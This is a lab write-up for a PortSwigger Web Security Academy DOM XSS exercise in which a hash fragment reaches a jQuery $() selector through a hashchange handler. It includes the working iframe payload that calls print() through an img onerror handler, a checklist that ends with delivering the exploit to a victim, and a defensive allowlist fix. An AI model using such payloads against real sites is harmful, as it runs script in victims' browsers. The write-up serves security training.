DOM XSS in jQuery Selector Sink Using a Hashchange Event

PortSwigger Web Security Academy · Apprentice lab writeup

DOM-based XSS location.hash jQuery $() selector hashchange Exploit Server

1. Lab objective

The home page contains a DOM-based cross-site scripting vulnerability. The page reads a post title from the URL fragment using location.hash. That value is then passed into jQuery's $() selector function to find and automatically scroll to a post.

The goal is to deliver an exploit to the victim that executes print() in the victim's browser.

Result: The lab was solved with an iframe whose onload handler appends an HTML payload to the target URL's fragment.

2. What I learned

  • DOM XSS can happen entirely in the browser without the server reflecting the payload into the HTML response.
  • location.hash reads the URL fragment after the #.
  • The browser console is useful for checking the current fragment and monitoring hash changes.
  • A jQuery selector sink can become dangerous when attacker-controlled data is used as a selector.
  • The right payload depends on the exact context where the input is inserted.
  • Burp helps inspect requests and application behavior, while DevTools helps inspect the DOM and execute JavaScript experiments.
  • An exploit server can deliver a payload to a victim, which is different from simply proving the vulnerability locally.

4. Understanding the URL fragment

Consider this example:

https://example.com/?page=home#post-4
ExpressionValue
location.hrefThe complete URL.
location.search?page=home
location.hash#post-4

The fragment is commonly used for page navigation, anchors, tabs, and client-side routing. It is especially interesting in DOM XSS because JavaScript can read it directly from the browser.

5. Using the browser console

5.1 Check the current hash

Open the lab home page, press F12 or Ctrl + Shift + I, select the Console tab, and run:

location.hash

If the URL ends with #post-4, the console should return a string similar to:

"#post-4"

5.2 Check the complete URL

location.href

5.3 Change the hash manually

location.hash = "post-4";

This changes the URL fragment without necessarily reloading the whole page. It can also trigger a hashchange event.

5.4 Listen for hash changes

window.addEventListener("hashchange", () => {
  console.log("Hash changed to:", location.hash);
});

Now change the fragment in the address bar or run:

location.hash = "post-5";

The console should log the new hash. This is useful when the vulnerable code runs only after a hash change.

5.5 Inspect the decoded fragment

decodeURIComponent(location.hash.slice(1));

slice(1) removes the leading #. decodeURIComponent() converts percent-encoded characters into their readable form.

Important: Do not assume the fragment is automatically decoded in every application. Check how the page processes it. The relevant value may be raw, decoded, normalized, or transformed before reaching the sink.

6. Finding the vulnerable code with DevTools

  1. Open the lab home page.
  2. Press F12 to open DevTools.
  3. Use the Sources tab or choose View page source.
  4. Press Ctrl + F and search for terms such as hashchange, location.hash, scroll, $(), or a post identifier.
  5. Look for code that reads the hash and passes it into jQuery.

The vulnerable logic is conceptually similar to:

window.addEventListener("hashchange", function () {
    var postTitle = decodeURIComponent(location.hash.slice(1));

    var post = $("section.blog-list h2:contains(" + postTitle + ")");

    if (post.length) {
        post[0].scrollIntoView();
    }
});

The exact source code may differ, but the important pattern is:

attacker-controlled hash
        ↓
location.hash
        ↓
string concatenation
        ↓
jQuery $() selector
        ↓
DOM interpretation

7. Why the jQuery selector is dangerous

jQuery's $() function is normally used to select elements:

$(".post-title");

However, jQuery can also interpret certain HTML-looking strings as markup:

$("
Example
");

If untrusted input is concatenated into a selector, an attacker may be able to break out of the intended selector and supply HTML that creates an event-handler execution path.

The vulnerability is not simply that location.hash exists. The vulnerability occurs because untrusted hash data reaches a dangerous interpretation point without adequate validation or safe handling.

8. Building the exploit

The successful payload was:

<iframe src="https://0a01002a03cc74e880b10d5b008100d7.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

Formatted for readability:

<iframe
  src="https://0a01002a03cc74e880b10d5b008100d7.web-security-academy.net/#"
  onload="this.src+='<img src=x onerror=print()>'"
></iframe>

8.1 What each part does

Payload partPurpose
<iframe>Loads the vulnerable lab inside a frame.
src=".../#"Loads the target page with an initially empty fragment.
onloadRuns after the iframe loads.
this.src += ...Appends the HTML-looking string to the iframe's current URL.
<img src=x ...>Creates an image element with an intentionally invalid source.
onerror="print()"Runs when the image fails to load.

8.2 Why the hashchange event matters

The iframe first loads the target with:

https://0a01002a03cc74e880b10d5b008100d7.web-security-academy.net/#

When the iframe finishes loading, the onload handler changes its URL fragment by appending:

<img src=x onerror=print()>

That fragment change triggers the target page's hashchange handler. The vulnerable code reads the new hash and passes it to jQuery's selector function, where the HTML-looking input is interpreted and the image error handler executes.

11. Common mistakes

  • Using location.search when the lab uses location.hash.
  • Testing a payload on the wrong page.
  • Forgetting that a hashchange-based vulnerability may require the fragment to change after the page has loaded.
  • Looking only at the server response and not inspecting browser-side JavaScript.
  • Using the wrong lab ID in the iframe.
  • Testing the payload in the exploit server editor but forgetting to click View exploit.
  • Confirming local execution but forgetting to click Deliver to victim.
  • Assuming every jQuery selector is exploitable without checking the exact selector construction and version.

12. A reusable DOM XSS checklist

  • Identify the page where the vulnerability exists.
  • Inspect the JavaScript with DevTools or Burp.
  • Search for sources: location.hash, location.search, location.href, document.URL, and document.referrer.
  • Find the transformation: decoding, parsing, concatenation, or string replacement.
  • Identify the sink: jQuery selector, innerHTML, document.write, eval, URL assignment, or an event-handler attribute.
  • Determine the exact context where the input lands.
  • Use a harmless marker first, such as TEST123.
  • Use the console to verify the source value.
  • Monitor relevant events such as hashchange.
  • Build a payload that matches the context.
  • Test locally with View exploit.
  • Deliver the exploit to the victim.

13. Defensive lesson

The safe approach is to avoid passing untrusted strings into HTML-capable jQuery APIs or selector contexts without strict validation. The application should use safe DOM APIs, validate the expected post identifier, and avoid concatenating attacker-controlled data into selectors.

For example, instead of accepting an arbitrary title from the fragment, the application could allow only a known post ID:

const allowedPostIds = new Set(["post-1", "post-2", "post-3"]);
const requestedId = location.hash.slice(1);

if (allowedPostIds.has(requestedId)) {
  document.getElementById(requestedId)?.scrollIntoView();
}

This is illustrative defensive code: the exact implementation should match the application's real DOM structure and routing design.
